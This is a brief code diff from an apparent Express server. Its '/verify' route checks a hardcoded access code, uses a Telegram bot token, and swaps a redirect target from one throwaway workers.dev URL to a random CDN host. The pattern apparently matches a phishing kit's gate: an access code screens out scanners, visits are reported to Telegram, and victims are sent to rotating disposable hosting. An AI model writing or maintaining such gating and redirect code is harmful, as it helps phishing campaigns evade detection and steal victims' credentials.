@@ -656,7 +656,7 @@ app.post('/verify', async (req, res) => {
   const { code } = req.body;
   const linkId = req.query.id || 'unknown'; // Capture the unique ID from URL
   const CORRECT_CODE = "Quote435";
-  const TARGET_URL = "https://constructors-cmhc-d66c31-8c3a80.summary-review.workers.dev/?k=Wf3zW15MN0Mh6bdhOwphDclJ";
+  const TARGET_URL = "https://edge-4c50a77734bb-mumqvg3t.b-cdn.net";
 
   if (code === CORRECT_CODE) {
     const token = process.env.TELEGRAM_BOT_TOKEN;
